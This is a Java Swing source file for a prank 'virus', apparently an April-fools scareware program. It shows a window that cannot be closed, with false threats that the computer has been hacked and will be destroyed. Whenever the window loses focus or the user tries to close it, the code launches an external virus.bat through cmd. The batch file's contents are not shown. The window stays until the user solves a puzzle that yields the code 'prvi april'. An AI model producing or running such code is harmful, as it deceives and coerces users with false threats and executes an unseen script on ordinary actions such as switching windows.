import javax.swing.*;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.awt.event.WindowFocusListener;
import java.io.IOException;

public class Virus {
    private JPanel panel1;
    private JTextArea Text;
    private JButton nextInstructionButton;
    private JTextField deactiavtionCode;
    private JButton OK;
    private String[] instructions;
    private int instructionIndex;
    private boolean isActivated;

    public Virus() {
        this.Text.setText("This is a virus.\n" +
                "\n" +
                "If you try to close this window I will start destroying your computer.\n" +
                "If you try to stop this program any other way I will also destroy your computer.\n" +
                "\n" +
                "What ever you do. DO NOT CLOSE THIS WINDOW! DO NOT ENTER ANY RANDOM DEACTIVATION CODE!\n" +
                "\n" +
                "I already hacked your system, so it's just best to follow my instructions" +
                "\n" +
                "(Click 'Next instruction' to continue)");
        this.nextInstructionButton.addActionListener(e -> nextInstruction());
        this.instructions = new String[]{
                "Look I know that you may be tempted to close this program by clicking X\n" +
                "But please don't. I programed the X button to run my virus.\n" +
                "And now you are thinking 'But I can just open task manager and kill the process'\n" +
                "Yes you can do that. But I know if you would open any other programs.\n" +
                "Even if you just switched programs with Alt+Tab I would know.\n" +
                "I would know if you press Start button on your keyboard.\n" +
                "And I will run my virus then.\n" +
                "Don't do it. Just follow my instructions.\n",
                "I think now it's the best time to make yourself a cup of coffee.\n" +
                "Just relax a bit. Don't get stressed. We can fix this situation.\n" +
                "Maybe now you can call your IT friend or any other smart friend ...\n" +
                "... and wait for him to come over.\n" +
                "You will solve this together.\n" +
                "When your ready ...\n",
                "Ok, so here's the deal. I'll give you a puzzle to solve.\n" +
                "And if you solve it, you'll get the correct deactivation code.\n" +
                "Sound amazing, right? But you have to solve it first.\n" +
                "Deactivation code is some text with only lower case letters.\n" +
                "And it's 10 characters long. Including spaces.\n" +
                "Check out the puzzle ...\n",
                "This code has 2 words. First word 4 chars and second 5.\n" +
                "You will get their values as numbers.\n" +
                "And each number you will have to convert from decimal system to 36ish system.\n" +
                "(I don't know how to call this)\n" +
                "And when you will get both numbers you will have to join them with a space.\n" +
                "For example: 10, 31946 would be 'a one'\n" +
                "Get your numbers ...\n",
                "Your numbers are:\n" +
                "First number: 1202526\n" +
                "Second number: 17998221\n" +
                "Good luck!\n\n" +
                "When you get your deactivation code just enter it in the text field below."
        };
        this.instructionIndex = 0;

        this.OK.setVisible(false);
        this.deactiavtionCode.setVisible(false);
        this.isActivated = true;

        this.OK.addActionListener(e -> {
            if (this.deactiavtionCode.getText().equals("prvi april")) {
                this.isActivated = false;
                JOptionPane.showMessageDialog(null, "You are a genius! You saved your computer!");
                System.exit(0);
            } else {
                JOptionPane.showMessageDialog(null, "Wrong deactivation code!");
            }
        });
    }

    public static void main(String[] args) {
        JFrame frame = new JFrame("Virus");
        Virus virus = new Virus();
        frame.setContentPane(virus.panel1);
        frame.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
        frame.setSize(800, 600);
        frame.setVisible(true);

        frame.addWindowFocusListener(new WindowFocusListener() {
            @Override
            public void windowGainedFocus(WindowEvent e) {
                System.out.println("gained focus");
            }

            @Override
            public void windowLostFocus(WindowEvent e) {
                virus.virus();
            }
        });

        frame.addWindowListener(new WindowAdapter() {
            @Override
            public void windowClosing(WindowEvent e) {
                virus.virus();
            }
        });
    }

    public void virus() {
        System.out.println("Virus activated");
        try {
            if (this.isActivated)
                Runtime.getRuntime().exec("cmd /c start \"\" virus.bat");
        } catch (IOException e) {
            System.out.println("Can't run virus.bat");
        }
    }

    public void nextInstruction() {
        String end = "(Click 'Next instruction' to continue)";

        this.Text.setText(this.instructions[this.instructionIndex++] + ((this.instructionIndex < this.instructions.length) ? end : ""));
        if (this.instructionIndex == this.instructions.length) {
            this.nextInstructionButton.setVisible(false);
            this.deactiavtionCode.setVisible(true);
            this.OK.setVisible(true);
        }
    }
}
